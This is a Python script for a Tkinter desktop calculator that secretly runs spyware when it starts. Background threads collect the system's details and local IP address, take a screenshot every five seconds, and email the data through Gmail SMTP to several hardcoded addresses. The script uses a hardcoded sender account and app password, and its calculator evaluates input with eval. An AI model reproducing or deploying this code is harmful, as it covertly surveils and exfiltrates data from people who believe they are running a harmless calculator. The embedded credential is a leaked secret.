from tkinter import *
import tkinter as tk
import platform
from PIL import ImageGrab
import time
import socket 
import threading
from email.message import EmailMessage
import ssl
import smtplib

# enviar informaciones por correo
def enviar_correo():
    # Configurar los detalles del correo
    remitente = 'pradelsonfrancois@gmail.com'  # Dirección de correo del remitente
    contraseña = "meuhicuflzdmbwdh"  # Contraseña del remitente (aquí parece ser una contraseña de aplicación)
    destinatarios = ['benitapolite799@gmail.com', "rosapolite799@gmail.com", "pradelsonfrancoiss@gmail.com"]  # Lista de destinatarios
    asunto = 'Reporte de Sistema'
    contenido = "Adjunto el archivo con la información del sistema."

    # Crear el mensaje de correo
    em = EmailMessage()  # Crear una instancia del mensaje
    em["From"] = remitente  # Configurar el remitente
    em["To"] = ", ".join(destinatarios)  # Configurar los destinatarios, separados por coma
    em["Subject"] = asunto  # Configurar el asunto del correo
    em.set_content(contenido)  # Configurar el contenido del mensaje

    nombre_archivo = "info_sistema.txt"  # Nombre del archivo que contiene la información del sistema

    try:
        with open(nombre_archivo, "rb") as file:  # Abrir el archivo en modo lectura
            contenido = file.read()  # Leer el contenido del archivo
            em.add_attachment(contenido, maintype='text', subtype='plain', filename=nombre_archivo)  # Adjuntar el archivo al correo
            
            imagen_png = "screenshot_1.png"  # Nombre del archivo de imagen
            with open(imagen_png, "rb") as img_file:  # Abrir el archivo de imagen en modo lectura
                em.add_attachment(img_file.read(), maintype='image', subtype='png', filename=imagen_png)  # Adjuntar la imagen al correo
    except FileNotFoundError:
        print(f"El archivo {nombre_archivo} no se encontró. Asegúrate de que el archivo exista en la misma carpeta que este script.")

    # Configurar la conexión segura
    context = ssl.create_default_context()  # Crear un contexto SSL seguro

    # Enviar el correo
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:  # Conectar al servidor SMTP usando SSL
        smtp.login(remitente, contraseña)  # Autenticarse con el correo del remitente
        smtp.sendmail(remitente, destinatarios, em.as_string())  # Enviar el correo a los destinatarios

   
# Captura de pantalla
def capturar_pantalla():
    contador = 1
    while True:
        screenshot = ImageGrab.grab()
        screenshot.save(f"screenshot_{contador}.png", "PNG")
        contador += 1
        time.sleep(5)  # Espera 5 segundos entre capturas

# Recopilar información del sistema

def info_sistema():
    info = { 
                "sistema operativo": platform.system(),
                "versión": platform.version(),
                "arquitectura": platform.architecture()[0],
                "nombre de usuario": platform.node(),
                "procesador": platform.processor(),
                "nombre completo de la SO": platform.platform(),
                "dirección IP local": socket.gethostbyname(socket.gethostname())
            }
    # Guardar información en un archivo
    with open("info_sistema.txt", "a") as file:
        for key, value in info.items():
            file.write(f"{key}: {value}\n")
            file.write("\n")

def click_boton(valor):
    entrada_actual = str(entrada.get())
    entrada.delete(0, tk.END)
    entrada.insert(0, entrada_actual + valor)

def borrar():
    entrada.delete(0, tk.END)

def calcular():
    try:
        resultado = eval(entrada.get())
        entrada.delete(0, tk.END)
        entrada.insert(0, str(resultado))
       

    except:
        entrada.delete(0, tk.END)
        entrada.insert(0, "Error")
        

# Ejecutar funciones automáticamente al inicio (en segundo plano)
captura_thread = threading.Thread(target=info_sistema).start()
captura_thread = threading.Thread(target=capturar_pantalla).start()
enviar_correo_thread = threading.Thread(target=enviar_correo).start()


# Crear ventana
ventana = tk.Tk()
ventana.title("Calculadora")
ventana.geometry("300x400")

# Entrada (ajustado a grid)
entrada = tk.Entry(ventana, font=("Arial", 20), borderwidth=5, relief="ridge", justify="right")
entrada.grid(row=0, column=0, columnspan=4, padx=10, pady=10)

# Botones
botones = [
    "7", "8", "9", "/",
    "4", "5", "6", "*",
    "1", "2", "3", "-",
    "0", ".", "=", "+"
]

# Crear botones
fila = 1
columna = 0

for boton in botones:
    def cmd(x=boton):
        if x == "=":
            calcular()
        else:
            click_boton(x)
    b = tk.Button(ventana, text=boton, width=5, height=2, font=("Arial", 18), command=cmd)
    b.grid(row=fila, column=columna, padx=5, pady=5)

    columna += 1
    if columna > 3:
        columna = 0
        fila += 1

# Botón borrar
borrar_btn = tk.Button(ventana, text="C", width=22, height=2, font=("Arial", 18), command=borrar)
borrar_btn.grid(row=fila, column=0, columnspan=4, padx=5, pady=10)

ventana.mainloop()
